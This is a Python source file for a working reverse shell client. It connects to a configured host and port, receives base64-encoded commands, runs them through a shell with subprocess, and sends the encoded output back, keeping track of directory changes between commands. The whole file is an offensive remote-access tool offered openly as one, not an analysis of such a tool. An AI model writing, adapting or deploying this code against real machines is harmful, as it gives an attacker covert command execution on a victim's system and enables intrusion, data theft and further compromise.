import socket
# import argparse
import subprocess
import pyfiglet
import os
import base64

"""This function is used to encode the data to be send"""
def en(data):
    return base64.b64encode(data.encode())

"""This is used to decode the instructions arriving from the remote computer"""
def de(data):
    return base64.b64decode(data)

"""This is the driver code"""
def main():
    os.system('tput clear')
    f=pyfiglet.Figlet(font='cybermedium')
    print(f.renderText('Reverse Shell'))
    print ('\033[1m')
    print("Simplifies command execution on a system with reverse shell access")
    print ('\033[0m')
    # Configuring the script to connect to the remote culprit system
    RHOST='localhost'
    RPORT=8006
    # Establihing connection with the remote system
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((RHOST,RPORT))
    # Receiving commands from the remote system
    currentDirectory="./"
    while True:
        data1=s.recv(4096)
        data=de(data1)
        test=data.decode()
        if test[:2]=='cd':
            try:
                currentDirectory+=test.split()[1]+"/"
                # print('The current directory is:',currentDirectory)
                mess='Changed Directory~'
                mess=en(mess)
                s.send(mess)
            except:
                mess=en('Error...~')
                s.send(mess)
        # Executing the output using the subprocess lib
        else:
            # print("Current directory is:",currentDirectory)
            try:
                comm=subprocess.Popen(data.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, cwd=currentDirectory)
                res1,res2=comm.communicate()
                res=res1.decode()+'~'+res2.decode()
                # Sending the encoded data over the sockets
                res=en(res)
                s.send(res)

                # Simplified the currentDirectory variable
                comm1=subprocess.Popen('pwd', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, cwd=currentDirectory)
                es1,es2=comm1.communicate()
                currentDirectory=es1.decode()[:len(es1.decode())-1]+'/'
                # print('Current dir now:',currentDirectory)

            except:
                res=en("Error...")
                s.send(res)
            # s.close()

if __name__ == '__main__':
    main()
